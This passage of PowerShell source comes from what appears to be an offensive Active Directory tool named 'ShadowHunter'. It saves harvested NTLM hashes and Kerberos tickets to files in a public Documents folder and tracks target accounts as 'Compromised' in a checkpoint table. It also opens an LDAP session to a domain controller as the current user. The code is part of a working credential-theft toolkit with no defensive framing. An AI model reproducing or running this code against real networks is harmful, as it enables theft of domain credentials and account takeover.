		$TGTLocation = Join-Path -Path $locationdirectory -ChildPath "TGTs.txt"
		$TGTPath = "C:\Users\Public\Documents\ShadowHunter\TGTs.txt"
		$hashoutput | Out-File -FilePath $NTfilePath
		$hashoutput | Out-File -FilePath $NTLocation
		$ResultsTable | Where-Object {$_.NT_Hash} | Format-Table -AutoSize | Out-File -FilePath $ResultsPath
		$ResultsTable | Where-Object {$_.NT_Hash} | Format-Table -AutoSize | Out-File -FilePath $ResultsLocation
		$ResultsTable | Format-Table -AutoSize | Out-File -FilePath $FullResultsPath
		$ResultsTable | Format-Table -AutoSize | Out-File -FilePath $FullResultsLocation
		$TGTOutput | Out-File -FilePath $TGTLocation
		$TGTOutput | Out-File -FilePath $TGTPath
	}
	else{
		$NTfilePath = "C:\Users\Public\Documents\ShadowHunter\NTLM_Hashes.txt"
		$ResultsPath = "C:\Users\Public\Documents\ShadowHunter\Results.txt"
		$FullResultsPath = "C:\Users\Public\Documents\ShadowHunter\Results_Full.txt"
		$TGTPath = "C:\Users\Public\Documents\ShadowHunter\TGTs.txt"
		$hashoutput | Out-File -FilePath $NTfilePath
		$ResultsTable | Where-Object {$_.NT_Hash} | Format-Table -AutoSize | Out-File -FilePath $ResultsPath
		$ResultsTable | Format-Table -AutoSize | Out-File -FilePath $FullResultsPath
		$TGTOutput | Out-File -FilePath $TGTPath
	}
	
}

function AddToTable {
	
	param (
		[array]$table,
		[string]$UserName,
		[string]$NTHash,
		[string]$Ticket,
		[string]$CheckPoint
	)
	
	$TargetClientInfo = $table | Where-Object { $_.Targets -eq $UserName }

	if($NTHash){
		$TargetClientInfo.NT_Hash = $NTHash
		$TargetClientInfo.Compromised = "YES"
		$TargetClientInfo.Compromised_As = "Manual"
		Write-Output " [+] Adding NT_Hash $NTHash to $UserName"
	}

	if($Ticket){
		$TargetClientInfo.TGT = $Ticket
		$TargetClientInfo.Compromised = "YES"
		$TargetClientInfo.Compromised_As = "Manual"
		Write-Output " [+] Adding Ticket to $UserName"
	}
	
	#Write-Output ""
	if($NTHash -OR $Ticket){
		
		if(Test-Path -Path c:\Users\Public\Documents\ShadowHunter\){}
		else{New-Item -Path c:\Users\Public\Documents\ShadowHunter\ -ItemType Directory | Out-Null}
		
		if(Test-Path -Path c:\Users\Public\Documents\ShadowHunter\PFX\){}
		else{New-Item -Path c:\Users\Public\Documents\ShadowHunter\PFX\ -ItemType Directory | Out-Null}
		
		if($CheckPoint){
			$table | Export-Clixml -Path "$CheckPoint"
			$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
		}
		else{$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"}
	}
}

function Establish-LDAPSession {
	
	param (
		[array]$SessionDomain
	)
	
	# Define LDAP parameters
	$ldapServer = Get-DomainController -trgtdomain $SessionDomain
	$ldapPort = 389 # Use 636 for LDAPS (SSL)

	# Load necessary assembly
	Add-Type -AssemblyName "System.DirectoryServices.Protocols"

	# Create LDAP directory identifier
	$identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ldapServer, $ldapPort)

	# Establish LDAP connection as current user
	$ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)

	# Use Negotiate (Kerberos or NTLM) for authentication
	$ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

	# Bind (establish connection)
	$ldapConnection.Bind()  # Bind as the current user
	
	return $ldapConnection
}
